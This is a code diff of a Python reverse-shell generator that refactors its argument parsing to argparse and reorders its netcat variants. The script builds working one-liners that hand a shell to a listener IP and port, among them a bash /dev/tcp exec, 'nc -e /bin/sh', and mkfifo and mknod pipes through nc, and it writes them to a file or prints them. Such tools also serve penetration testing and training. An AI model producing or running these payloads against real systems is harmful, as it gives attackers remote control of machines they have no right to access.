@@ -3,65 +3,76 @@ import sys
 import os
 import socket
 import re
+import argparse
 
-methods=['bash','bash2','netcat','netcat2','netcat3','netcat4','perl','perl2','perl3','php','python','ruby','ruby2','ruby3','telnet']
+methods=[
+    'bash','bash2',
+    'netcat','netcat2','netcat3','netcat4',
+    'perl','perl2','perl3',
+    'php',
+    'python',
+    'ruby','ruby2','ruby3',
+    'telnet'
+]
 
-def GREEN(text):
-    return "\033[32m{}\033[0m".format(str(text))
+def GREEN(text): return "\033[32m{}\033[0m".format(str(text))
+
+def availableMethods():
+    text = "Methods available:"
+    text = text + "\n - " + GREEN("bash")
+    text = text + "\n - " + GREEN("bash2")
+    text = text + "\n - " + GREEN("netcat")
+    text = text + "\n - " + GREEN("netcat2")
+    text = text + "\n - " + GREEN("netcat3")
+    text = text + "\n - " + GREEN("netcat4")
+    text = text + "\n - " + GREEN("perl")
+    text = text + "\n - " + GREEN("perl2")
+    text = text + "\n - " + GREEN("perl3")
+    text = text + "\n - " + GREEN("php")
+    text = text + "\n - " + GREEN("python")
+    text = text + "\n - " + GREEN("ruby")
+    text = text + "\n - " + GREEN("ruby2")
+    text = text + "\n - " + GREEN("ruby3")
+    text = text + "\n - " + GREEN("telnet")
+    text = text + "\nEach method explained in detail in https://github.com/n0nuser/Reversegen"
+    return text
 
 def usage():
-    print("python reversegen.py <Method> <IP> <Port> [-f fileName]\n")
-    print("Methods available:")
-    print(" - " + GREEN("bash"))
-    print(" - " + GREEN("bash2"))
-    print(" - " + GREEN("netcat"))
-    print(" - " + GREEN("netcat2"))
-    print(" - " + GREEN("netcat3"))
-    print(" - " + GREEN("netcat4"))
-    print(" - " + GREEN("perl"))
-    print(" - " + GREEN("perl2"))
-    print(" - " + GREEN("perl3"))
-    print(" - " + GREEN("php"))
-    print(" - " + GREEN("python"))
-    print(" - " + GREEN("ruby"))
-    print(" - " + GREEN("ruby2"))
-    print(" - " + GREEN("ruby3"))
-    print(" - " + GREEN("telnet"))
-    print("Each method explained in detail in the README.")
+    print(availableMethods())
     sys.exit()
 
-# Validations
+def get_args():
+    desc = 'This is a simple Reverse Shell Generator.\n' + availableMethods()
+    parser = argparse.ArgumentParser(description=desc, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("-m", type=str, help="Language used for the Reverse Shell", dest="method", required=True)
+    parser.add_argument("-i", type=str, help="IP address of the listener", dest="ip", required=True)
+    parser.add_argument("-p", type=int, help="Port of the listener", dest="port", required=True)
+    parser.add_argument("-o", type=str, help="Output File", dest="filename", required=False)
+    args = parser.parse_args()
 
-if (len(sys.argv) != 4 and len(sys.argv) != 6): 
-    usage()
-elif (str(sys.argv[1]) not in methods): 
-    usage()
-elif (not (1 <= int(sys.argv[3]) <= 65535)):
-    print("That port can't be used!")
-    sys.exit()
+    method = args.method
+    ip = args.ip
+    port = args.port
+    filename = args.filename
 
-# Variables
-
-method = str(sys.argv[1])
-
-if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",str(sys.argv[2]))):
-    ip = str(sys.argv[2])
-else:
-    try:
-        ip = socket.gethostbyname(str(sys.argv[2]))
-    except:
-        print("Invalid Host!")
+    # Validations
+    ## 
+    if (method not in methods): 
+        usage()
+    elif (not (1 <= port <= 65535)):
+        print("That port can't be used!")
         sys.exit()
 
-port = str(sys.argv[3])
+    if (not(re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",ip))):
+        try:
+            ip = socket.gethostbyname(ip)
+        except:
+            print("Invalid Host!")
+            sys.exit()
 
-save = False
-if (len(sys.argv) == 6):
-    if (str(sys.argv[4]) == "-f"):
-        save = True
-        filename = str(sys.argv[5])
-    else:
-        usage()
+    return method,ip,str(port),filename
+
+method, ip, port, filename = get_args()
 
 # Selects method
 
@@ -72,13 +83,13 @@ if(method == 'bash2'):
     data = "0<&196;exec 196<>/dev/tcp/" + ip + "/" + port + "; sh <&196 >&196 2>&196"
 
 elif(method == 'netcat'):
-    data = "nc -e /bin/sh "+ ip + " " + port
-
-elif(method == 'netcat2'):
-    data = "/bin/sh | nc " + ip + " " + port
-
-elif(method == 'netcat3'):
     data = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f"
+    
+elif(method == 'netcat2'):
+    data = "nc -e /bin/sh "+ ip + " " + port
+    
+elif(method == 'netcat3'):
+    data = "/bin/sh | nc " + ip + " " + port
 
 elif(method == 'netcat4'):
     data = "rm -f /tmp/p; mknod /tmp/p p && nc " + ip + " " + port + " 0/tmp/p"
@@ -112,7 +123,7 @@ elif(method == 'telnet'):
 
 # Writes to file and prints out
 
-if (save):
+if (filename):
     file = open(filename,'w')
     file.write(data + "\n")
     file.close()
